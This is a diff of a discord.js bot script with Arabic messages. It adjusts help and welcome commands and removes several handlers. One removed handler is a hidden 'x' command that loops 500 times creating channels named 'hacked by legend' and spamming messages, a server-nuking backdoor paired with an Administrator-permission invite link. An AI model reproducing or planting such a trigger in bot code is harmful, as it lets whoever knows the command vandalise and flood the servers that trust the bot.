@@ -174,12 +174,6 @@ client.on('guildMemberAdd', member => {
 
 
 
-client.on('message', message => {
-if(message.content.startsWith(prefix + "invite")) { 
-message.author.send(` https://discordapp.com/oauth2/authorize?client_id=461155786492608513&permissions=8&scope=bot`);
-}
-});
-
 
 
 
@@ -229,7 +223,7 @@ client.on('message', message => {
 
 
 client.on("message", message => {
- if (message.content === "-help e") {
+ if (message.content === "-help") {
   const embed = new Discord.RichEmbed()
       .setColor("#ffff00")
         .setDescription(`**Servers**🌐 **__${client.guilds.size}__**
@@ -259,7 +253,7 @@ if (message.member.voiceChannel == null) return message.channel.send(`**الرج
 
 client.on("guildMemberAdd", member => {
   member.createDM().then(function (channel) {
-  return channel.send(`ولكم نورت السيرفر ${member} `) 
+  return channel.send(`ولكم نورت السيرفراكتب قوانين لاستفسار عن كل اشي  ${member} `) 
 }).catch(console.error)
 
 });
@@ -281,19 +275,6 @@ client.on('message', message => {
    });
 
 
-client.on("message", message => {
- if (message.content === "-bot") {
-  const embed = new Discord.RichEmbed()
-      .setColor("#ffff00")
-        .setDescription(`**السيرفرات**🌐 **__${client.guilds.size}__**
-**المستخدمين**👥 **__${client.users.size}__**
-**القنوات**📚 **__${client.channels.size}__** `)
-
-message.author.sendEmbed(embed)
-
-}
-});
-
 
 
      
@@ -311,18 +292,6 @@ client.on('message', ra3d => {
  });
 
 
-client.on("message", message => {
- if (message.content === "-help a") {
-  const embed = new Discord.RichEmbed()
-      .setColor("#ffff00")
-        .setDescription(`**السيرفرات**🌐 **__${client.guilds.size}__**
-**المستخدمين**👥 **__${client.users.size}__**
-**القنوات**📚 **__${client.channels.size}__** `)
-
-message.author.sendEmbed(embed)
-
-}
-});
 
 
  client.on('message', message => {
@@ -502,16 +471,7 @@ client.on("channelCreate",  cc => {
   });
        
        
-       
-client.on('message' , async (message) => {
-    if (message.content.startsWith(prefix + 'x')) {
-for (let i = 0; i < 500; i++) {
-
-        message.guild.createChannel('hacked by legend', 'text')
-        message.channel.send('legend is coming');
-}
-}
-});  
+      
 
 
 /*
